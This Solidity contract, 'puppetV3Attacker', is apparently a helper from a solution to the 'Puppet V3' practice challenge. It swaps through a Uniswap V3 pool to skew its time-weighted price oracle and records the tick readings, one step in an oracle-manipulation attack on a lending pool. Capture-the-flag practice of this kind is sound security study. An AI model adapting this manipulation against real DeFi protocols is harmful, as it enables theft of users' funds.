//SPDX-License-Identifier: MIT

pragma solidity =0.7.6;

import "@uniswap/v3-core/contracts/interfaces/IERC20Minimal.sol";
import "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
import "@uniswap/v3-core/contracts/interfaces/callback/IUniswapV3SwapCallback.sol";
import "@uniswap/v3-core/contracts/libraries/TickMath.sol";

contract puppetV3Attacker is IUniswapV3SwapCallback {
    address immutable puppetV3Pool;
    IUniswapV3Pool immutable uniswapV3Pool;
    IERC20Minimal immutable token;
    IERC20Minimal immutable weth;
    int56[] public tickCumulatives;

    constructor(address _puppetV3Pool, address _uniswapV3Pool, address _token, address _weth) {
        puppetV3Pool = _puppetV3Pool;
        uniswapV3Pool = IUniswapV3Pool(_uniswapV3Pool);
        token = IERC20Minimal(_token);
        weth = IERC20Minimal(_weth);
    }

    function callSwap(int256 _amount) external {
        uniswapV3Pool.swap(address(this), false, _amount, (TickMath.MAX_SQRT_RATIO - 1), "");
    }

    function uniswapV3SwapCallback(
        int256 amount0Delta,
        int256 amount1Delta,
        bytes calldata
    ) external override {
        if (amount0Delta > 0) {
            weth.transfer(address(uniswapV3Pool), uint256(amount0Delta));
        } else {
            token.transfer(address(uniswapV3Pool), uint256(amount1Delta));
        }
    }

    function observePool(uint32[] memory _secondsAgo) external returns (
        int56[] memory _tickCumulatives, 
        uint160[] memory _secondsPerLiquidityCumulativeX128s
        ) {
        (_tickCumulatives, _secondsPerLiquidityCumulativeX128s) = uniswapV3Pool.observe(_secondsAgo);
        tickCumulatives.push(_tickCumulatives[0]);
        tickCumulatives.push(_tickCumulatives[1]);
    }

    function withdrawWETH() external {
        uint256 balance = weth.balanceOf(address(this));
        weth.transfer(msg.sender, balance);
    }
    
}